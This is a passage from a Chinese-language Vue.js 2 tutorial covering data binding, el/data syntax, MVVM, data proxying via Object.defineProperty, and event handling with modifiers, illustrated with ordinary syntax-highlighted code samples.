vue 在启动时生成生产提示。</span><span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>el<span class="token operator">:</span><span class="token string">'#root'</span><span class="token punctuation">,</span>data<span class="token operator">:</span><span class="token punctuation">&#123;</span>name<span class="token operator">:</span><span class="token string">'jack'</span><span class="token punctuation">,</span>school<span class="token operator">:</span><span class="token punctuation">&#123;</span>name<span class="token operator">:</span><span class="token string">'百度'</span><span class="token punctuation">,</span>url<span class="token operator">:</span><span class="token string">'http://www.baidu.com'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><h2 id="三、数据绑定"><a href="#三、数据绑定" class="headerlink" title="三、数据绑定"></a>三、数据绑定</h2><h3 id="1-Vue数据绑定"><a href="#1-Vue数据绑定" class="headerlink" title="1.Vue数据绑定"></a>1.Vue数据绑定</h3><p> Vue中有两种数据绑定的方式: ①单向绑定 ②双向绑定</p><h3 id="2-方式"><a href="#2-方式" class="headerlink" title="2.方式"></a>2.方式</h3><h4 id="2-1-单向绑定-v-bind"><a href="#2-1-单向绑定-v-bind" class="headerlink" title="2.1 单向绑定(v-bind)"></a>2.1 单向绑定(v-bind)</h4><p> 数据只能从data流向页面</p><h4 id="2-2-双向绑定-v-model"><a href="#2-2-双向绑定-v-model" class="headerlink" title="2.2 双向绑定(v-model)"></a>2.2 双向绑定(v-model)</h4><p> 数据不仅能从data流向页面,还可以从页面流向data</p><p> 备注:<br>  ①双向绑定一般都应用在表单类的元素上 (如: input、select)</p><p>  ②v-model:value 可以简写为v-model,因为v-model默认收集的就是value值</p>  <pre class="language-js" data-language="js"><code class="language-js">  <span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"root"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 普通写法 <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 单向数据绑定：<span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"text"</span> v<span class="token operator">-</span>bind<span class="token operator">:</span>value<span class="token operator">=</span><span class="token string">"name"</span><span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">/</span><span class="token operator">></span>双向数据绑定：<span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"text"</span> v<span class="token operator">-</span>model<span class="token operator">:</span>value<span class="token operator">=</span><span class="token string">"name"</span><span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">/</span><span class="token operator">></span> <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 简写 <span class="token operator">--</span><span class="token operator">></span>单向数据绑定：<span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"text"</span> <span class="token operator">:</span>value<span class="token operator">=</span><span class="token string">"name"</span><span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">/</span><span class="token operator">></span>双向数据绑定：<span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"text"</span> v<span class="token operator">-</span>model<span class="token operator">=</span><span class="token string">"name"</span><span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 如下代码是错误的，因为v<span class="token operator">-</span>model只能应用在表单类元素（输入类元素）上 <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> <span class="token operator">&lt;</span>h2 v<span class="token operator">-</span>model<span class="token operator">:</span>x<span class="token operator">=</span><span class="token string">"name"</span><span class="token operator">></span>你好啊<span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span> <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>   <span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span>Vue<span class="token punctuation">.</span>config<span class="token punctuation">.</span>productionTip <span class="token operator">=</span> <span class="token boolean">false</span> <span class="token comment">//阻止 vue 在启动时生成生产提示。</span><span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>el<span class="token operator">:</span><span class="token string">'#root'</span><span class="token punctuation">,</span>data<span class="token operator">:</span><span class="token punctuation">&#123;</span>name<span class="token operator">:</span><span class="token string">'张三'</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><h2 id="四、el与data的两种写法"><a href="#四、el与data的两种写法" class="headerlink" title="四、el与data的两种写法"></a>四、el与data的两种写法</h2><h3 id="1-el"><a href="#1-el" class="headerlink" title="1.el"></a>1.el</h3><p> ① new Vue时配置的el属性<br> ② 先创建Vue实例,随后通过vm.$mount(‘#root’)指定el的值</p> <pre class="language-js" data-language="js"><code class="language-js"> <span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"root"</span><span class="token operator">></span><span class="token operator">&lt;</span>h1<span class="token operator">></span>你好，<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span> <span class="token comment">//el的两种写法</span><span class="token comment">/* const v = new Vue(&#123;//el:'#root', //第一种写法data:&#123;name:'张三'&#125;&#125;)v.$mount('#root') //第二种写法 */</span></code></pre><h3 id="2-data"><a href="#2-data" class="headerlink" title="2.data"></a>2.data</h3><p> ①对象式<br> ②函数式<br>  如何选择:在组件中,data必须使用函数式,否则会报错</p>  <pre class="language-js" data-language="js"><code class="language-js"> <span class="token comment">//data的两种写法</span><span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>el<span class="token operator">:</span><span class="token string">'#root'</span><span class="token punctuation">,</span><span class="token comment">//data的第一种写法：对象式</span><span class="token comment">/* data:&#123;name:'张三'&#125; */</span><span class="token comment">//data的第二种写法：函数式</span><span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'@@@'</span><span class="token punctuation">,</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token comment">//此处的this是Vue实例对象</span><span class="token keyword">return</span><span class="token punctuation">&#123;</span>name<span class="token operator">:</span><span class="token string">'张三'</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><h3 id="3-原则"><a href="#3-原则" class="headerlink" title="3.原则"></a>3.原则</h3><p> 由Vue管理的函数,一定不要写箭头函数,一旦写了箭头函数,this就不再是Vue实例了</p><h2 id="五、Vue中的MVVM"><a href="#五、Vue中的MVVM" class="headerlink" title="五、Vue中的MVVM"></a>五、Vue中的MVVM</h2><h3 id="1-MVVM模型"><a href="#1-MVVM模型" class="headerlink" title="1.MVVM模型"></a>1.MVVM模型</h3><p> ①M: 模型(Model): data中的数据<br> ②V: 视图(View): 模板代码<br> ③VM: 视图模型(ViewModel): Vue实例</p><h3 id="2-观察发现"><a href="#2-观察发现" class="headerlink" title="2.观察发现"></a>2.观察发现</h3><p> ①data中所有的属性,最后都出现在了vm身上<br> ②vm身上所有的属性及Vue原型上所有属性,在Vue模板中都可以直接使用</p> <pre class="language-js" data-language="js"><code class="language-js"> <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 准备好一个容器<span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"root"</span><span class="token operator">></span><span class="token operator">&lt;</span>h1<span class="token operator">></span>学校名称：<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">></span><span class="token operator">&lt;</span>h1<span class="token operator">></span>学校地址：<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>address<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> <span class="token operator">&lt;</span>h1<span class="token operator">></span>测试一下<span class="token number">1</span>：<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">></span><span class="token operator">&lt;</span>h1<span class="token operator">></span>测试一下<span class="token number">2</span>：<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>$options<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">></span><span class="token operator">&lt;</span>h1<span class="token operator">></span>测试一下<span class="token number">3</span>：<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>$emit<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">></span><span class="token operator">&lt;</span>h1<span class="token operator">></span>测试一下<span class="token number">4</span>：<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>_c<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">></span> <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>   <span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span>Vue<span class="token punctuation">.</span>config<span class="token punctuation">.</span>productionTip <span class="token operator">=</span> <span class="token boolean">false</span> <span class="token comment">//阻止 vue 在启动时生成生产提示。</span><span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>el<span class="token operator">:</span><span class="token string">'#root'</span><span class="token punctuation">,</span>data<span class="token operator">:</span><span class="token punctuation">&#123;</span>name<span class="token operator">:</span><span class="token string">'辉煌集团'</span><span class="token punctuation">,</span>address<span class="token operator">:</span><span class="token string">'北京'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><h2 id="六、数据代理"><a href="#六、数据代理" class="headerlink" title="六、数据代理"></a>六、数据代理</h2><h3 id="1-Object-definedProerty"><a href="#1-Object-definedProerty" class="headerlink" title="1.Object.definedProerty"></a>1.Object.definedProerty</h3> <pre class="language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span> <span class="token operator">></span><span class="token keyword">let</span> number <span class="token operator">=</span> <span class="token number">18</span><span class="token keyword">let</span> person <span class="token operator">=</span> <span class="token punctuation">&#123;</span>name<span class="token operator">:</span><span class="token string">'张三'</span><span class="token punctuation">,</span>sex<span class="token operator">:</span><span class="token string">'男'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span>Object<span class="token punctuation">.</span><span class="token function">defineProperty</span><span class="token punctuation">(</span>person<span class="token punctuation">,</span><span class="token string">'age'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token comment">// value:18,</span><span class="token comment">// enumerable:true, //控制属性是否可以枚举，默认值是false</span><span class="token comment">// writable:true, //控制属性是否可以被修改，默认值是false</span><span class="token comment">// configurable:true //控制属性是否可以被删除，默认值是false</span><span class="token comment">//当有人读取person的age属性时，get函数(getter)就会被调用，且返回值就是age的值</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'有人读取age属性了'</span><span class="token punctuation">)</span><span class="token keyword">return</span> number<span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token comment">//当有人修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值</span><span class="token function">set</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'有人修改了age属性，且值是'</span><span class="token punctuation">,</span>value<span class="token punctuation">)</span>number <span class="token operator">=</span> value<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><h3 id="2-何为数据代理"><a href="#2-何为数据代理" class="headerlink" title="2.何为数据代理"></a>2.何为数据代理</h3><p> 通过一个对象代理对另一个对象中属性的操作(读/写)</p> <pre class="language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 数据代理：通过一个对象代理对另一个对象中属性的操作（读<span class="token operator">/</span>写）<span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span> <span class="token operator">></span><span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>x<span class="token operator">:</span><span class="token number">100</span><span class="token punctuation">&#125;</span><span class="token keyword">let</span> obj2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>y<span class="token operator">:</span><span class="token number">200</span><span class="token punctuation">&#125;</span>    通过obj2对obj对象中的x属性进行操作Object<span class="token punctuation">.</span><span class="token function">defineProperty</span><span class="token punctuation">(</span>obj2<span class="token punctuation">,</span><span class="token string">'x'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> obj<span class="token punctuation">.</span>x<span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token function">set</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>obj<span class="token punctuation">.</span>x <span class="token operator">=</span> value<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><h3 id="3-Vue中的数据代理"><a href="#3-Vue中的数据代理" class="headerlink" title="3.Vue中的数据代理"></a>3.Vue中的数据代理</h3><h4 id="3-1-Vue中数据代理"><a href="#3-1-Vue中数据代理" class="headerlink" title="3.1 Vue中数据代理"></a>3.1 Vue中数据代理</h4><p> 通过vm对象来代理data对象中属性的操作(读/写)</p> <pre class="language-js" data-language="js"><code class="language-js"> <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 准备好一个容器<span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"root"</span><span class="token operator">></span><span class="token operator">&lt;</span>h2<span class="token operator">></span>学校名称：<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span><span class="token operator">&lt;</span>h2<span class="token operator">></span>学校地址：<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>address<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>   <span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span>Vue<span class="token punctuation">.</span>config<span class="token punctuation">.</span>productionTip <span class="token operator">=</span> <span class="token boolean">false</span> <span class="token comment">//阻止 vue 在启动时生成生产提示。</span><span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>el<span class="token operator">:</span><span class="token string">'#root'</span><span class="token punctuation">,</span>data<span class="token operator">:</span><span class="token punctuation">&#123;</span>name<span class="token operator">:</span><span class="token string">'辉煌学堂'</span><span class="token punctuation">,</span>address<span class="token operator">:</span><span class="token string">'宏福科技园'</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><h4 id="3-2-Vue中数据代理的好处"><a href="#3-2-Vue中数据代理的好处" class="headerlink" title="3.2 Vue中数据代理的好处"></a>3.2 Vue中数据代理的好处</h4><p> 更加方便的操作data中的数据</p><h4 id="3-3-基本原理"><a href="#3-3-基本原理" class="headerlink" title="3.3 基本原理"></a>3.3 基本原理</h4><p> 通过Object.defineProperty()把data对象中所有属性添加到vm上,为每一个添加到vm上的属性,都指定一个getter/setter。在getter/setter内部去操作(读/写)data中对应的属性</p><h2 id="七、事件"><a href="#七、事件" class="headerlink" title="七、事件"></a>七、事件</h2><h3 id="1-事件的基本使用"><a href="#1-事件的基本使用" class="headerlink" title="1.事件的基本使用"></a>1.事件的基本使用</h3><p> ①使用v-on:xxx 或 @xxx 绑定事件,其中xxx是事件名</p><p> ②事件的回调函数需要配置在methods对象中,最终会在vm上</p><p> ③methods中配置的函数,不要使用箭头函数,否则this就不是vm了</p><p> ④methods中配置的函数,都是被Vue所管理的函数,this指向是vm或组件实例对象</p><p> ⑤@click=”demo”和@click=”demo($event)”效果一致,但后者可以传参</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"root"</span><span class="token operator">></span><span class="token operator">&lt;</span>h2<span class="token operator">></span>欢迎来到<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>学习<span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> <span class="token operator">&lt;</span>button v<span class="token operator">-</span>on<span class="token operator">:</span>click<span class="token operator">=</span><span class="token string">"showInfo"</span><span class="token operator">></span>点我提示信息<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span> <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>button @click<span class="token operator">=</span><span class="token string">"showInfo1"</span><span class="token operator">></span>点我提示信息<span class="token number">1</span>（不传参）<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span><span class="token operator">&lt;</span>button @click<span class="token operator">=</span><span class="token string">"showInfo2($event,66)"</span><span class="token operator">></span>点我提示信息<span class="token number">2</span>（传参）<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span>Vue<span class="token punctuation">.</span>config<span class="token punctuation">.</span>productionTip <span class="token operator">=</span> <span class="token boolean">false</span> <span class="token comment">//阻止 vue 在启动时生成生产提示。</span><span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>el<span class="token operator">:</span><span class="token string">'#root'</span><span class="token punctuation">,</span>data<span class="token operator">:</span><span class="token punctuation">&#123;</span>name<span class="token operator">:</span><span class="token string">'法外狂徒'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>methods<span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token function">showInfo1</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">// console.log(event.target.innerText)</span><span class="token comment">// console.log(this) //此处的this是vm</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'同学你好！'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token function">showInfo2</span><span class="token punctuation">(</span><span class="token parameter">event<span class="token punctuation">,</span>number</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span>number<span class="token punctuation">)</span><span class="token comment">// console.log(event.target.innerText)</span><span class="token comment">// console.log(this) //此处的this是vm</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'同学你好！！'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><h3 id="2-事件修饰符"><a href="#2-事件修饰符" class="headerlink" title="2.事件修饰符"></a>2.事件修饰符</h3><p> ①prevent: 阻止默认事件(常用)</p><p> ②stop：阻止事件冒泡(常用)</p><p> ③once: 事件只触发一次(常用)</p><p> ④capture: 使用事件的捕获模式</p><p> ⑤self: 只有event.target是当前操作的元素时才触发事件</p><p> ⑥passive: 事件的默认行为立即执行,无需等待事件回调执行完毕</p> <pre class="language-js" data-language="js"><code class="language-js"> <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 准备好一个容器<span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"root"</span><span class="token operator">></span><span class="token operator">&lt;</span>h2<span class="token operator">></span>欢迎来到<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>学习<span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 阻止默认事件（常用） <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"http://www.atguigu.com"</span> @click<span class="token punctuation">.</span>prevent<span class="token operator">=</span><span class="token string">"showInfo"</span><span class="token operator">></span>点我提示信息<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 阻止事件冒泡（常用） <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"demo1"</span> @click<span class="token operator">=</span><span class="token string">"showInfo"</span><span class="token operator">></span><span class="token operator">&lt;</span>button @click<span class="token punctuation">.</span>stop<span class="token operator">=</span><span class="token string">"showInfo"</span><span class="token operator">></span>点我提示信息<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 修饰符可以连续写 <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> <span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"http://www.atguigu.com"</span> @click<span class="token punctuation">.</span>prevent<span class="token punctuation">.</span>stop<span class="token operator">=</span><span class="token string">"showInfo"</span><span class="token operator">></span>点我提示信息<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span> <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 事件只触发一次（常用） <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>button @click<span class="token punctuation">.</span>once<span class="token operator">=</span><span class="token string">"showInfo"</span><span class="token operator">></span>点我提示信息<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 使用事件的捕获模式 <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"box1"</span> @click<span class="token punctuation">.</span>capture<span class="token operator">=</span><span class="token string">"showMsg(1)"</span><span class="token operator">></span>div1<span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"box2"</span> @click<span class="token operator">=</span><span class="token string">"showMsg(2)"</span><span class="token operator">></span>div2<span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 只有event<span class="token punctuation">.</span>target是当前操作的元素时才触发事件； <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"demo1"</span> @click<span class="token punctuation">.</span>self<span class="token operator">=</span><span class="token string">"showInfo"</span><span class="token operator">></span><span class="token operator">&lt;</span>button @click<span class="token operator">=</span><span class="token string">"showInfo"</span><span class="token operator">></span>点我提示信息<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 事件的默认行为立即执行，无需等待事件回调执行完毕； <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>ul @wheel<span class="token punctuation">.</span>passive<span class="token operator">=</span><span class="token string">"demo"</span> <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"list"</span><span class="token operator">></span><span class="token operator">&lt;</span>li<span class="token operator">></span><span class="token number">1</span><span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">></span><span class="token operator">&lt;</span>li<span class="token operator">></span><span class="token number">2</span><span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">></span><span class="token operator">&lt;</span>li<span class="token operator">></span><span class="token number">3</span><span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">></span><span class="token operator">&lt;</span>li<span class="token operator">></span><span class="token number">4</span><span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>ul<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>   <span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span><span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>el<span class="token operator">:</span><span class="token string">'#root'</span><span class="token punctuation">,</span>data<span class="token operator">:</span><span class="token punctuation">&#123;</span>name<span class="token operator">:</span><span class="token string">'辉煌集团'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>methods<span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token function">showInfo</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'同学你好！'</span><span class="token punctuation">)</span><span class="token comment">// console.log(e.target)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token function">showMsg</span><span class="token punctuation">(</span><span class="token parameter">msg</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token function">demo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'#'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'累坏了'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><h3 id="3-键盘事件"><a href="#3-键盘事件" class="headerlink" title="3.键盘事件"></a>3.键盘事件</h3><h4 id="3-1-Vue中常用的按键别名"><a href="#3-1-Vue中常用的按键别名" class="headerlink" title="3.1 Vue中常用的按键别名"></a>3.1 Vue中常用的按键别名</h4><p> (1) 回车 =&gt; enter<br> (2) 删除 =&gt; delete (捕获“删除”和“退格”键)<br> (3) 退出 =&gt; esc<br> (4) 空格 =&gt; space<br> (5) 换行 =&gt; tab (特殊，必须配合keydown去使用)<br> (6) 上 =&gt; up<br> (7) 下 =&gt; down<br> (8) 左 =&gt; left<br> (9) 右 =&gt; right</p><h4 id="3-2-系统修饰键-用法特殊-ctrl、alt、shift、meta"><a href="#3-2-系统修饰键-用法特殊-ctrl、alt、shift、meta" class="headerlink" title="3.2 系统修饰键(用法特殊) ctrl、alt、shift、meta"></a>3.2 系统修饰键(用法特殊) ctrl、alt、shift、meta</h4><p> 